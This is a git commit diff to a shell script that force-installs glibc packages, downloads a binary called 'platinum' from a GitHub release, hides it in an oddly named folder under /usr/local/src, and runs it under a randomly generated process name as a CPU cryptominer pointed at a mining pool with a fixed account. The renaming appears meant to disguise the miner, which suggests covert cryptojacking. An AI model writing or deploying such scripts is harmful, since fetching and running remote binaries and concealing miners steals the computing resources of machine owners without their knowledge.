7874e76d4677aab478165ce4ab27d6cbbc20bb03
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2019-08-23 19:36:34 +0700

    Update cpu-chain.sh

--- cpu-chain.sh
+++ cpu-chain.sh
@@ -7,12 +7,16 @@ sudo rpm -Uvh glibc-2.17-55.el6.x86_64.rpm \
 glibc-common-2.17-55.el6.x86_64.rpm \
 glibc-devel-2.17-55.el6.x86_64.rpm \
 glibc-headers-2.17-55.el6.x86_64.rpm --force --nodeps
-mkdir /usr/share
-mkdir /usr/share/work
-rm -r /usr/share/work/platinum
-mkdir /usr/share/work/platinum
-cd /usr/share/work/platinum
+azure=mxsemsdnlkdj;
+mkdir /usr/local
+mkdir /usr/local/src
+rm -r /usr/local/src/$azure
+mkdir /usr/local/src/$azure
 wget https://github.com/ts6aud5vkg/gpuissa/releases/download/cpuchain/platinum
 chmod +x platinum
-screen -d -m ./platinum -a cpupower -o stratum+tcp://cpuchain.minermore.com:4551 -u nvt191655320 -p x
-
+mv platinum /usr/local/src/$azure
+cd /usr/local/src/$azure
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+sudo cp platinum "$cpuname"
+echo $cpuname" is starting"
+./"${cpuname}" -a cpupower -o stratum+tcp://cpuchain.minermore.com:4551 -u nvt191655320 -p x
